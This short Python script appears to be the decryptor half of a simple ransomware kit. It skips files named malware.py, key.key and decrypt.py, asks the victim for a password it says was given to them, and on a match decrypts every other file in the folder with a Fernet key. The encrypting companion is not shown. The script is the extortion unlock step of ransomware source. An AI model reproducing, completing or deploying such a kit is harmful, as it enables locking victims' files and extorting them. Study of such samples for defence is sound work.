from cryptography.fernet import Fernet
import os

allfiles=[]
for file in os.listdir():
    if file == "malware.py" or file == "key.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        allfiles.append(file)

print(allfiles)

with open("key.key","rb") as key:
    password = key.read()

passphase="enter your screct password" #enter your password
userphase=input("[+]enter the password i have given u ") 

if passphase==userphase:
    for file in allfiles:
        with open(file,"rb") as thefile:
            content = thefile.read()
        content_decr = Fernet(password).decrypt(content)
        with open(file,"wb") as thefile:
            thefile.write(content_decr)
        print("[+]the files are decrypted")
else:
    print("[+] the password is worng pls enter the correct password")